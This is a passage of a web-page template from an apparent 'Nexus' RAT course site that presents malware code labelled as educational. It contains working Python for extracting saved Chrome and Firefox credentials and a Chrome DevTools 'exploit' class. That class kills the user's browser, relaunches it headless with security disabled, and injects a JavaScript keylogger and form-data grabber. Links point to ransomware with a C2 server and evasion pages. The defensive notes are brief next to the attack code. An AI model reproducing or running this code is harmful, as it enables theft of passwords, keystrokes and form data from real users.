                                    'browser': 'Chrome'
                                })
                    
                    conn.close()
                    os.remove(temp_db_path)
            
            return credentials
            
        except Exception as e:
            print(f"[!] Chrome credential extraction failed: {e}")
            return []
    
    def extract_firefox_credentials(self):
        """
        Extract Firefox credentials using NSS library
        Educational analysis of Firefox password storage
        """
        try:
            # Firefox uses NSS (Network Security Services)
            # Requires additional libraries for decryption
            # This is a simplified educational example
            
            profiles_path = self.browsers['firefox']['path']
            
            if not os.path.exists(profiles_path):
                return []
            
            credentials = []
            
            # Process Firefox profiles
            for profile in os.listdir(profiles_path):
                if profile.endswith('.default') or profile.endswith('.default-release'):
                    profile_path = os.path.join(profiles_path, profile)
                    logins_json_path = os.path.join(profile_path, 'logins.json')
                    
                    if os.path.exists(logins_json_path):
                        with open(logins_json_path, 'r') as f:
                            logins_data = json.load(f)
                        
                        for login in logins_data.get('logins', []):
                            credentials.append({
                                'url': login.get('hostname', ''),
                                'username': login.get('encryptedUsername', ''),
                                'password': '[ENCRYPTED - NSS Required]',
                                'browser': 'Firefox'
                            })
            
            return credentials
            
        except Exception as e:
            print(f"[!] Firefox credential extraction failed: {e}")
            return []

# Educational Browser Security Analysis
def analyze_browser_security():
    """
    Educational analysis of browser credential security
    FOR DEFENSIVE SECURITY RESEARCH ONLY
    """
    security_analysis = {
        'chrome_protection': {
            'encryption': 'AES-256-GCM with DPAPI master key',
            'storage': 'SQLite database in user profile',
            'vulnerabilities': [
                'DPAPI keys accessible to user processes',
                'Database can be copied and processed offline',
                'Master key extraction from Local State file'
            ],
            'detection_methods': [
                'Monitor access to Login Data files',
                'Detect sqlite3.exe process spawning',
                'Watch for DPAPI CryptUnprotectData calls'
            ]
        },
        'firefox_protection': {
            'encryption': 'NSS (Network Security Services)',
            'storage': 'JSON files with encrypted fields',
            'vulnerabilities': [
                'Master password can be empty',
                'NSS database accessible to user processes',
                'Potential key extraction from memory'
            ],
            'detection_methods': [
                'Monitor logins.json access',
                'Detect NSS library loading',
                'Watch for key4.db database access'
            ]
        }
    }
    
    print("=== Browser Security Analysis ===")
    for browser, details in security_analysis.items():
        print(f"Browser: {browser}")
        print(f"  Encryption: {details['encryption']}")
        print(f"  Storage: {details['storage']}")
        print(f"  Vulnerabilities: {len(details['vulnerabilities'])} identified")
        print(f"  Detection Methods: {len(details['detection_methods'])} available")
        print()
    
    return security_analysis</code></pre>
                        <div class="warning-overlay" id="cred-warning">
                            <div class="text-center">
                                <i class="fas fa-database text-2xl mb-2"></i>
                                <div>Credential Analysis</div>
                                <div class="text-sm">Security Research Only</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- WebSocket Exploitation -->
            <div class="mb-12">
                <div class="educational-note rounded-lg p-6 mb-6">
                    <div class="flex items-center mb-3">
                        <i class="fas fa-globe text-blue-400 text-xl mr-3"></i>
                        <h3 class="text-lg font-bold text-white">WebSocket Exploitation</h3>
                    </div>
                    <p class="text-blue-100">
                        Analysis of Chrome DevTools protocol exploitation for browser control and keylogging.
                    </p>
                </div>
                
                <div class="code-container bg-gray-900 rounded-lg overflow-hidden border border-gray-700 relative">
                    <div class="bg-gray-800 px-6 py-3 border-b border-gray-700">
                        <div class="flex items-center justify-between">
                            <h4 class="text-white font-semibold">WebSocket Exploitation Framework</h4>
                            <div class="flex space-x-2">
                                <button onclick="toggleBlur('websocket-code')" class="px-3 py-1 bg-blue-600 hover:bg-blue-700 text-white text-xs rounded">
                                    Reveal Technique
                                </button>
                                <span class="px-3 py-1 bg-orange-600 text-white text-xs rounded">Browser Security</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="p-6">
                        <pre class="blur-sensitive" id="websocket-code"><code class="language-python"># WebSocket Exploitation - Educational Analysis
import websocket
import json
import threading
import subprocess
import time
import psutil
import requests

class ChromeDevToolsExploit:
    """
    Educational analysis of Chrome DevTools protocol exploitation
    Understanding browser automation and keylogging techniques
    """
    
    def __init__(self):
        self.websocket_url = None
        self.ws = None
        self.connected = False
        self.command_id = 1
        self.keylog_data = []
        
    def find_chrome_debugging_port(self):
        """
        Find Chrome instances with debugging enabled
        Educational analysis of browser process detection
        """
        try:
            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                if proc.info['name'] == 'chrome.exe':
                    cmdline = ' '.join(proc.info['cmdline'])
                    if '--remote-debugging-port=' in cmdline:
                        # Extract debugging port
                        for arg in proc.info['cmdline']:
                            if arg.startswith('--remote-debugging-port='):
                                port = arg.split('=')[1]
                                return int(port)
            return None
            
        except Exception as e:
            print(f"[!] Chrome process detection failed: {e}")
            return None
    
    def restart_chrome_with_debugging(self):
        """
        Restart Chrome with debugging enabled
        Educational analysis of headless browser techniques
        """
        try:
            # Kill existing Chrome processes
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'chrome.exe':
                    proc.kill()
            
            time.sleep(2)
            
            # Start Chrome with debugging enabled
            chrome_path = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
            debug_port = 9222
            
            cmd = [
                chrome_path,
                '--remote-debugging-port=' + str(debug_port),
                '--disable-background-timer-throttling',
                '--disable-renderer-backgrounding',
                '--disable-backgrounding-occluded-windows',
                '--headless',  # Run in headless mode
                '--no-sandbox',
                '--disable-web-security',
                '--user-data-dir=' + tempfile.mkdtemp()
            ]
            
            subprocess.Popen(cmd, shell=True)
            time.sleep(3)
            
            return debug_port
            
        except Exception as e:
            print(f"[!] Chrome restart failed: {e}")
            return None
    
    def get_websocket_url(self, debug_port):
        """
        Get WebSocket URL for DevTools connection
        """
        try:
            response = requests.get(f'http://localhost:{debug_port}/json')
            tabs = response.json()
            
            if tabs:
                # Use first available tab
                return tabs[0]['webSocketDebuggerUrl']
            return None
            
        except Exception as e:
            print(f"[!] WebSocket URL retrieval failed: {e}")
            return None
    
    def connect_to_devtools(self):
        """
        Connect to Chrome DevTools WebSocket
        Educational implementation of browser control
        """
        try:
            debug_port = self.find_chrome_debugging_port()
            
            if not debug_port:
                debug_port = self.restart_chrome_with_debugging()
            
            if not debug_port:
                return False
            
            self.websocket_url = self.get_websocket_url(debug_port)
            
            if not self.websocket_url:
                return False
            
            # Connect to WebSocket
            self.ws = websocket.WebSocketApp(
                self.websocket_url,
                on_open=self.on_open,
                on_message=self.on_message,
                on_error=self.on_error,
                on_close=self.on_close
            )
            
            # Start WebSocket in separate thread
            ws_thread = threading.Thread(target=self.ws.run_forever)
            ws_thread.daemon = True
            ws_thread.start()
            
            time.sleep(2)
            return self.connected
            
        except Exception as e:
            print(f"[!] DevTools connection failed: {e}")
            return False
    
    def on_open(self, ws):
        """WebSocket connection opened"""
        self.connected = True
        print("[+] Connected to Chrome DevTools")
        
        # Enable necessary domains
        self.send_command('Runtime.enable')
        self.send_command('Input.enable')
        self.send_command('Page.enable')
    
    def on_message(self, ws, message):
        """Process WebSocket messages"""
        try:
            data = json.loads(message)
            
            # Handle keypress events
            if 'method' in data and data['method'] == 'Input.keyDown':
                self.handle_keypress(data['params'])
            
        except Exception as e:
            print(f"[!] Message processing error: {e}")
    
    def on_error(self, ws, error):
        """WebSocket error handler"""
        print(f"[!] WebSocket error: {error}")
    
    def on_close(self, ws):
        """WebSocket connection closed"""
        self.connected = False
        print("[-] DevTools connection closed")
    
    def send_command(self, method, params=None):
        """
        Send command to Chrome DevTools
        Educational implementation of browser automation
        """
        if not self.connected:
            return False
        
        command = {
            'id': self.command_id,
            'method': method
        }
        
        if params:
            command['params'] = params
        
        self.ws.send(json.dumps(command))
        self.command_id += 1
        
        return True
    
    def inject_keylogger(self):
        """
        Inject keylogger script into browser
        Educational analysis of DOM manipulation
        """
        keylogger_script = '''
        (function() {
            let keyData = [];
            
            document.addEventListener('keydown', function(event) {
                let logEntry = {
                    timestamp: Date.now(),
                    key: event.key,
                    code: event.code,
                    url: window.location.href,
                    title: document.title
                };
                
                keyData.push(logEntry);
                
                // Send data back through console for capture
                console.log('KEYLOG:', JSON.stringify(logEntry));
            });
            
            // Capture form submissions
            document.addEventListener('submit', function(event) {
                let formData = new FormData(event.target);
                let formInfo = {
                    timestamp: Date.now(),
                    type: 'form_submit',
                    url: window.location.href,
                    data: Object.fromEntries(formData)
                };
                
                console.log('FORMLOG:', JSON.stringify(formInfo));
            });
        })();
        '''
        
        # Inject script into page
        self.send_command('Runtime.evaluate', {
            'expression': keylogger_script
        })
    
    def handle_keypress(self, params):
        """
        Handle captured keypress data
        Educational analysis of keystroke logging
        """
        keylog_entry = {
            'timestamp': time.time(),
            'key': params.get('key', ''),
            'code': params.get('code', ''),
            'type': params.get('type', '')
        }
        
        self.keylog_data.append(keylog_entry)
        print(f"[KEY] {keylog_entry['key']}")

# Educational Browser Security Analysis
def analyze_websocket_security():
    """
    Educational analysis of WebSocket security implications
    FOR DEFENSIVE SECURITY RESEARCH ONLY
    """
    security_implications = {
        'devtools_risks': {
            'description': 'Chrome DevTools protocol security risks',
            'vulnerabilities': [
                'Remote debugging allows full browser control',
                'WebSocket connections can inject arbitrary code',
                'Keylogger injection through Runtime.evaluate',
                'Form data capture through DOM manipulation'
            ],
            'detection_methods': [
                'Monitor Chrome processes with debugging flags',
                'Detect unusual WebSocket connections',
                'Watch for Runtime.evaluate API calls',
                'Monitor console.log patterns for data exfiltration'
            ],
            'prevention': [
                'Disable remote debugging in production',
                'Network monitoring for suspicious connections',
                'Browser extension security policies',
                'Content Security Policy implementation'
            ]
        }
    }
    
    print("=== WebSocket Security Analysis ===")
    for category, details in security_implications.items():
        print(f"Category: {category}")
        print(f"Description: {details['description']}")
        print(f"Vulnerabilities: {len(details['vulnerabilities'])} identified")
        print(f"Detection Methods: {len(details['detection_methods'])} available")
        print(f"Prevention Measures: {len(details['prevention'])} recommended")
        print()
    
    return security_implications</code></pre>
                        <div class="warning-overlay" id="websocket-warning">
                            <div class="text-center">
                                <i class="fas fa-globe text-2xl mb-2"></i>
                                <div>WebSocket Exploitation</div>
                                <div class="text-sm">Browser Security Research</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Navigation & Related Research -->
    <section class="py-12">
        <div class="px-8">
            <h2 class="text-3xl font-bold text-white mb-8 text-center">Related Research Components</h2>
            <div class="grid md:grid-cols-3 gap-6">
                <!-- Core Ransomware -->
                <div class="bg-gray-800/50 rounded-lg p-6 border border-red-500/30 hover:border-red-400/50 transition-all duration-300 group cursor-pointer" onclick="window.location.href='{{ route('nexus.core-ransomware') }}'">
                    <div class="flex items-center mb-4">
                        <div class="w-12 h-12 bg-gradient-to-br from-red-500 to-red-600 rounded-full flex items-center justify-center mr-4">
                            <i class="fas fa-lock text-white text-xl"></i>
                        </div>
                        <h3 class="text-xl font-semibold text-red-400 group-hover:text-red-300">Core Ransomware</h3>
                    </div>
                    <p class="text-gray-300 mb-4">Python-based ransomware implementation with AES-256 encryption and Flask C2 server.</p>
                    <div class="text-red-400 text-sm font-medium">
                        <i class="fas fa-arrow-right mr-2"></i>
                        Explore Implementation →
                    </div>
                </div>

                <!-- Evasion & Stealth -->
                <div class="bg-gray-800/50 rounded-lg p-6 border border-purple-500/30 hover:border-purple-400/50 transition-all duration-300 group cursor-pointer" onclick="window.location.href='{{ route('nexus.evasion-stealth') }}'">
                    <div class="flex items-center mb-4">
                        <div class="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 rounded-full flex items-center justify-center mr-4">
                            <i class="fas fa-eye-slash text-white text-xl"></i>
                        </div>
                        <h3 class="text-xl font-semibold text-purple-400 group-hover:text-purple-300">Evasion & Stealth</h3>
                    </div>
                    <p class="text-gray-300 mb-4">Anti-detection techniques and stealth operation methodologies.</p>
                    <div class="text-purple-400 text-sm font-medium">
                        <i class="fas fa-arrow-right mr-2"></i>
                        Explore Techniques →
                    </div>
                </div>

                <!-- Second Semester Overview -->
                <div class="bg-gray-800/50 rounded-lg p-6 border border-cyan-500/30 hover:border-cyan-400/50 transition-all duration-300 group cursor-pointer" onclick="window.location.href='{{ route('nexus.second-semester') }}'">
                    <div class="flex items-center mb-4">
                        <div class="w-12 h-12 bg-gradient-to-br from-cyan-500 to-cyan-600 rounded-full flex items-center justify-center mr-4">
                            <i class="fas fa-network-wired text-white text-xl"></i>
                        </div>
                        <h3 class="text-xl font-semibold text-cyan-400 group-hover:text-cyan-300">Integration Network</h3>
                    </div>
                    <p class="text-gray-300 mb-4">View the complete research integration network with RAT as central hub.</p>
                    <div class="text-cyan-400 text-sm font-medium">
                        <i class="fas fa-arrow-right mr-2"></i>
                        View Network →
                    </div>
                </div>
            </div>            <!-- Return to Main Navigation -->
            <div class="text-center mt-12">
                <a href="{{ route('nexus.index') }}" class="inline-flex items-center px-8 py-3 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-xl font-bold hover:from-blue-500 hover:to-purple-500 transition-all duration-300 border border-blue-400 shadow-lg hover:shadow-blue-500/25">
                    <i class="fas fa-home mr-3"></i>
                    Return to Nexus Home
                </a>
            </div>
        </div>
    </section>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>

<script>
    function toggleBlur(elementId) {
        const element = document.getElementById(elementId);
        const warning = document.getElementById(elementId.replace('-code', '-warning'));
        
        if (element && warning) {
            if (element.classList.contains('revealed')) {
                element.classList.remove('revealed');
                warning.style.display = 'flex';
            } else {
                const confirmed = confirm(
                    "This will reveal educational RAT framework for cybersecurity research only.\n\n" +
                    "By proceeding, you confirm that you are:\n" +
                    "• Using this for legitimate educational/research purposes\n" +
                    "• Developing defensive cybersecurity capabilities\n" +
                    "• Not intending to cause harm or unauthorized access\n\n" +
                    "Do you wish to continue?"
                );
                
                if (confirmed) {
                    element.classList.add('revealed');
                    warning.style.display = 'none';
                }
            }
        }
    }
    
    document.addEventListener('DOMContentLoaded', function() {
        const blurredElements = document.querySelectorAll('.blur-sensitive');
        blurredElements.forEach(element => {
            element.addEventListener('click', function() {
                const id = this.id;
                if (id) {
                    toggleBlur(id);
                }
            });
        });
    });
</script>
@endsection
